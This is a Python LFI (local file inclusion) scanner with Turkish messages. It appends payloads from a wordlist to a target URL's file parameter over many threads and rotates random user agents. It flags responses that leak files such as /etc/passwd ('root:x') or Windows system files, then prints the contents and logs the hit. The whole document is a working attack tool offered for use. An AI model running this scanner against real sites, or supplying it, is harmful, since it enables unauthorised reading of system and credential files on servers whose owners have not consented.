import requests, socket, sys, argparse, random, threading, OpenSSL,time
from bs4 import BeautifulSoup
from colorama import Fore, Style, init


LFI_LISTS = [lfi.strip() for lfi in open("lfi.txt")]
USERAGENT = [agent.strip() for agent in open('user-agents.txt')]
TIME = time.time()


parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help='example: http://evil.com?file=')
args = parse.parse_args()
url = args.url


increase_lfi_lists = 0
class lfi_scanner:

    def __init__(self,host):
        self.host = host

    def output(self,put):
        file = open("output.txt", "a")
        file.writelines(str(put) + "\n")

    def scans(self):
        global increase_lfi_lists
        global LFI_LISTS
        global USERAGENT
        increase_lfi_lists +=1
        try:
            req = requests.get(url + LFI_LISTS[increase_lfi_lists], headers={'User-Agent': random.choice(USERAGENT)}, timeout=2)
            req_Text = req.text
            if "root:x" in req_Text or \
                    "noexecute=optout" in req_Text or \
                    "OC_INIT_COMPONENT" in req_Text or \
                    "C:\WINDOWS\system32\Setup\iis.dll" in req_Text:
                print(Fore.RED + "LFI BULUNDU ==>" + req.url + Style.RESET_ALL)
                lfi_scanner(url).output(str("payload[" + str(increase_lfi_lists) + "] " + LFI_LISTS[increase_lfi_lists]) + "---" + str(req.url))
                print(req_Text)
                sys.exit()
            print(req.url)
        except requests.exceptions.ConnectionError:
            pass
        except OpenSSL.SSL.Error:
            pass
        except requests.exceptions.Timeout:
            pass


thread = []
p1 = lfi_scanner(url)
for thr in range(len(LFI_LISTS)-1):
    t1 = threading.Thread(target=p1.scans)
    t1.daemon = True
    thread.append(t1)

for thr1 in thread:
    thr1.start()
    #time.sleep(0.005)

for thr2 in thread:
    thr2.join()

now_time = time.time() - TIME
print("Geçen süre: "+str(now_time))
sys.exit()















